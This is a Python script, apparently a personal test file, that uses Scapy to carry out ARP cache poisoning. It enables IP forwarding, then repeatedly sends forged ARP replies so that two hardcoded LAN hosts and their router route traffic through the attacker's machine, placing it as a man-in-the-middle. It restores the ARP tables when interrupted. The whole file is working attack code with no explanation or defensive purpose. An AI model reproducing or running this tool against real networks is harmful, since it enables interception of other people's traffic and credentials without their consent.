# THIS WAS A TEST. IGNORE THIS FILE.
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from threading import Thread
import netifaces
import os
import sys

def getMac(ip):
	ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, inter=0.1)
	for s, r in ans:
		return r[Ether].src

class Poison:
	def __init__(self, rtrIP, tgtIP):
		self.rtrIP = rtrIP
		self.tgtIP = tgtIP
	def Spoof(self):
		tgtMAC = getMac(self.tgtIP)
		rtrMAC = getMac(self.rtrIP)
		send(ARP(op=2, pdst=self.tgtIP, psrc=self.rtrIP, hwdst=tgtMAC))
		send(ARP(op=2, pdst=self.rtrIP, psrc=self.tgtIP, hwdst=rtrMAC))
		print 'spoofed'

	def Restore(self):
		tgtMAC = getMac(self.tgtIP)
		rtrMAC = getMac(self.rtrIP)
		send(ARP(op=2, pdst=self.rtrIP, psrc=self.tgtIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=tgtMAC), count=4)
		send(ARP(op=2, pdst=self.tgtIP, psrc=self.rtrIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=rtrMAC), count=4)

def attack(rtrIP, tgtIP):
	psn = Poison(rtrIP, tgtIP)
	while True:
		try:
			psn.Spoof()
			time.sleep(1)
		except KeyboardInterrupt:
			psn.Restore()
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			sys.exit()

def main():
	#tgtIP = raw_input('Target: ')
	IPs = ['192.168.1.10', '192.168.1.113']
	rtrIP = str(netifaces.gateways()['default'][2][0])
	conf.iface = str(netifaces.gateways()['default'][2][1])
	conf.verb = 0
	print 'Router: %s\nInterface: %s'%(rtrIP, conf.iface)
	corr = raw_input('Is this correct? [y/n] ')
	if corr.lower().strip() == 'n':
		rtrIP = raw_input('Router IP: ')
		conf.iface = raw_input('Interface: ')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	for addr in IPs:
		print 'Spoofing ' + addr
		Thread(target=attack, args=(rtrIP, addr)).start()

if __name__ == '__main__':
	main()
